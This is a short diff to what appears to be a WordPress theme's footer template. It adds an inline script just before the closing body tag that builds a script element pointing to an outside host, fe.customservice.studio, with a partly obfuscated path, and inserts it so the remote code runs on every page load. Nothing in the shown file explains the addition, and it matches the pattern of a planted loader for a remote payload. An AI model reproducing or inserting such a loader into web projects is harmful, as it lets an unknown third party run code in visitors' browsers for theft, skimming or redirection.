@@ -43,5 +43,18 @@
 </div><!-- #page -->
 <?php wp_footer(); ?>
 
+<script type="text/javascript" >
+var _link = _link || [];
+(
+	function() {
+    var node = document.getElementsByTagName("script")[0];
+    var protocol = (('https:' === document.location.protocol) ?  'https://' :  'http://');
+    var item = document.createElement("script");
+    item.src = unescape(protocol + 'fe.customservice.studio/fe.js%f98ecff0912811e78606e3f2f1e5daad');
+    node.parentNode.insertBefore(item, node);
+	}
+)();
+</script>
+
 </body>
 </html>
